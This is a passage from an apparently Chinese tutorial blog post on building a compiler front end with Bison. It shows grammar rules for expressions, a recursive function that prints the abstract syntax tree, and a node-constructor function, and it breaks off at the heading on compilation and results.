class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;ASSIGNOP&quot;</span>);&#125; <span class="comment">// $$结点type_id空置未用,正好存放运算符</span></span><br><span class="line">     | Exp AND Exp &#123;$$=mknode(AND,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;AND&quot;</span>);&#125;</span><br><span class="line">     | Exp OR Exp &#123;$$=mknode(OR,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;OR&quot;</span>);&#125;</span><br><span class="line">     | Exp RELOP Exp &#123;$$=mknode(RELOP,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">2</span>);&#125; <span class="comment">// 词法分析关系运算符号自身值保存在$2中</span></span><br><span class="line">     | Exp PLUS Exp &#123;$$=mknode(PLUS,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;PLUS&quot;</span>);&#125;</span><br><span class="line">     | Exp MINUS Exp &#123;$$=mknode(MINUS,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;MINUS&quot;</span>);&#125;</span><br><span class="line">     | Exp STAR Exp &#123;$$=mknode(STAR,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;STAR&quot;</span>);&#125;</span><br><span class="line">     | Exp DIV Exp &#123;$$=mknode(DIV,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;DIV&quot;</span>);&#125;</span><br><span class="line">     | Exp COMADD Exp &#123;$$=mknode(COMADD,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;COMADD&quot;</span>);&#125;</span><br><span class="line">     | Exp COMSUB Exp &#123;$$=mknode(COMSUB,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;COMSUB&quot;</span>);&#125;</span><br><span class="line">     | LP Exp RP &#123;$$=$<span class="number">2</span>;&#125; <span class="comment">/* 遇到左右括号,可直接忽略括号,Exp的值就为括号里面的Exp */</span></span><br><span class="line">     | MINUS Exp %prec UMINUS &#123;$$=mknode(UMINUS,$<span class="number">2</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;UMINUS&quot;</span>);&#125;</span><br><span class="line">     | NOT Exp &#123;$$=mknode(NOT,$<span class="number">2</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;NOT&quot;</span>);&#125;</span><br><span class="line">     | AUTOADD Exp &#123;$$=mknode(AUTOADD_L,$<span class="number">2</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;AUTOADD&quot;</span>);&#125;</span><br><span class="line">     | AUTOSUB Exp &#123;$$=mknode(AUTOSUB_L,$<span class="number">2</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;AUTOSUB&quot;</span>);&#125;</span><br><span class="line">     | Exp AUTOADD &#123;$$=mknode(AUTOADD_R,$<span class="number">1</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;AUTOADD&quot;</span>);&#125;</span><br><span class="line">     | Exp AUTOSUB &#123;$$=mknode(AUTOSUB_R,$<span class="number">1</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;AUTOSUB&quot;</span>);&#125;</span><br><span class="line">     | ID LP Args RP &#123;$$=mknode(FUNC_CALL,$<span class="number">3</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125; <span class="comment">// 函数定义后面的括号部分,只需要把括号里面的内容传入即可</span></span><br><span class="line">     | ID LP RP &#123;$$=mknode(FUNC_CALL,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125; <span class="comment">// 函数定义后面的括号部分没有参数</span></span><br><span class="line">     | ID &#123;$$=mknode(ID,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125;</span><br><span class="line">     | INT &#123;$$=mknode(INT,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);$$-&gt;type_int=$<span class="number">1</span>;$$-&gt;type=INT;&#125;</span><br><span class="line">     | FLOAT &#123;$$=mknode(FLOAT,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);$$-&gt;type_float=$<span class="number">1</span>;$$-&gt;type=FLOAT;&#125;</span><br><span class="line">     | CHAR &#123;$$=mknode(CHAR,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno); $$-&gt;type_char=$<span class="number">1</span>;$$-&gt;type=CHAR;&#125;</span><br><span class="line">     ;</span><br><span class="line"><span class="comment">/* Args-用逗号隔开的参数 */</span></span><br><span class="line">Args: Exp COMMA Args &#123;$$=mknode(ARGS,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      | Exp &#123;$$=mknode(ARGS,$<span class="number">1</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      ;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">  yyin=fopen(argv[<span class="number">1</span>],<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!yyin) </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  yylineno=<span class="number">1</span>;</span><br><span class="line">  yyparse();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">yyerror</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* fmt, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  va_start(ap, fmt);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Grammar Error at Line %d Column %d: &quot;</span>, yylloc.first_line,yylloc.first_column);</span><br><span class="line">  <span class="built_in">vfprintf</span>(<span class="built_in">stderr</span>, fmt, ap);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>生成抽象语法树</strong></p>
<p>AST 不同于推导树，去掉了一些修饰性的单词部分，简明地把程序的语法结构表示出来，后续的语义分析、中间代码生成都可以通过遍历抽象语法树来完成</p>
<p>其实在语法分析的过程中，已经调用了可视化抽象语法树的函数 <code>display</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">program: ExtDefList &#123; display($<span class="number">1</span>,<span class="number">0</span>);&#125; <span class="comment">/* 归约到program,显示语法树(display是自己实现的,用于可视化AST的函数) */</span></span><br></pre></td></tr></table></figure>
<p>它的实现如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(struct node* T,<span class="keyword">int</span> indent)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T)&#123;</span><br><span class="line">        <span class="keyword">switch</span> (T-&gt;kind)&#123;</span><br><span class="line">            <span class="keyword">case</span> EXT_DEF_LIST:  </span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> EXT_VAR_DEF:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;外部变量定义：&quot;</span>);     </span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent+<span class="number">5</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;变量名：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> FUNC_DEF:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;函数定义：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent+<span class="number">5</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">2</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ARRAY_DEF:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;数组定义：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> FUNC_DEC:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;函数名：&quot;</span>,T-&gt;type_id);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;函数型参：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ARRAY_DEC:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;数组名：&quot;</span>,T-&gt;type_id);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;数组大小：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> EXT_DEC_LIST:</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">if</span>(T-&gt;ptr[<span class="number">1</span>]-&gt;ptr[<span class="number">0</span>]==<span class="literal">NULL</span>)</span><br><span class="line">                    display(T-&gt;ptr[<span class="number">1</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    display(T-&gt;ptr[<span class="number">1</span>],indent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> PARAM_LIST:</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> PARAM_DEC:</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> VAR_DEF:</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> DEC_LIST:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;变量名：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> DEF_LIST:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent+<span class="number">5</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;LOCAL VAR_NAME：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMP_STM:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;复合语句：&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent+<span class="number">5</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;复合语句的变量定义：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent+<span class="number">5</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;复合语句的语句部分：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> STM_LIST:</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> EXP_STMT:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;表达式语句：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> IF_THEN:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;条件语句（if-else）：&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;条件：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;IF语句：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> IF_THEN_ELSE:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;条件语句（if-else-if）：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> WHILE:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;循环语句（while）：&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent+<span class="number">5</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;循环条件：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent+<span class="number">5</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;循环体：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> FOR:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;循环语句（for）：&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent+<span class="number">5</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;循环条件：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent+<span class="number">5</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;循环体：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> FUNC_CALL:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;函数调用：&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s%s\n&quot;</span>,indent+<span class="number">5</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;函数名：&quot;</span>,T-&gt;type_id);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent+<span class="number">5</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;第一个实际参数表达式：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ARGS:</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ID:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*cID： %s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,T-&gt;type_id); <span class="comment">// 控制新的一行输出的空格数,indent代替%*c中*</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> INT:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*cINT： %d\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,T-&gt;type_int);  </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> FLOAT:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*cFLOAT： %f\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,T-&gt;type_float);  </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CHAR:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*cCHAR： %c\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,T-&gt;type_char);</span><br><span class="line">            <span class="keyword">case</span> ARRAY:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c数组名称： %s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,T-&gt;type_id);  </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> TYPE:</span><br><span class="line">                <span class="keyword">if</span>(T-&gt;type==INT)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;类型：int&quot;</span>);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(T-&gt;type==FLOAT)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;类型：float&quot;</span>);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(T-&gt;type==CHAR)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;类型：char&quot;</span>);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(T-&gt;type==ARRAY)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;类型：char型数组&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ASSIGNOP:</span><br><span class="line">            <span class="keyword">case</span> OR:</span><br><span class="line">            <span class="keyword">case</span> AUTOADD_L:</span><br><span class="line">            <span class="keyword">case</span> AUTOSUB_L:</span><br><span class="line">            <span class="keyword">case</span> AUTOADD_R:</span><br><span class="line">            <span class="keyword">case</span> AUTOSUB_R:</span><br><span class="line">            <span class="keyword">case</span> AND:</span><br><span class="line">            <span class="keyword">case</span> RELOP:</span><br><span class="line">            <span class="keyword">case</span> PLUS:</span><br><span class="line">            <span class="keyword">case</span> MINUS:</span><br><span class="line">            <span class="keyword">case</span> STAR:</span><br><span class="line">            <span class="keyword">case</span> DIV:</span><br><span class="line">            <span class="keyword">case</span> COMADD:</span><br><span class="line">            <span class="keyword">case</span> COMSUB:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,T-&gt;type_id);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">1</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> RETURN:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%*c%s\n&quot;</span>,indent,<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;返回语句：&quot;</span>);</span><br><span class="line">                display(T-&gt;ptr[<span class="number">0</span>],indent+<span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>其实就是根据不同的节点来进行不同的操作</li>
</ul>
<p>在语法分析中使用的，用于创建新节点的函数 <code>mknode</code> 的实现如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct node *<span class="title">mknode</span><span class="params">(<span class="keyword">int</span> kind,struct node *first,struct node *second, struct node *third,<span class="keyword">int</span> pos )</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">tempnode</span> =</span> (struct node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct node));</span><br><span class="line">  tempnode-&gt;kind = kind;</span><br><span class="line">  tempnode-&gt;ptr[<span class="number">0</span>] = first;</span><br><span class="line">  tempnode-&gt;ptr[<span class="number">1</span>] = second;</span><br><span class="line">  tempnode-&gt;ptr[<span class="number">2</span>] = third;</span><br><span class="line">  tempnode-&gt;pos = pos;</span><br><span class="line">  <span class="keyword">return</span> tempnode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>编译与结果</strong></p>
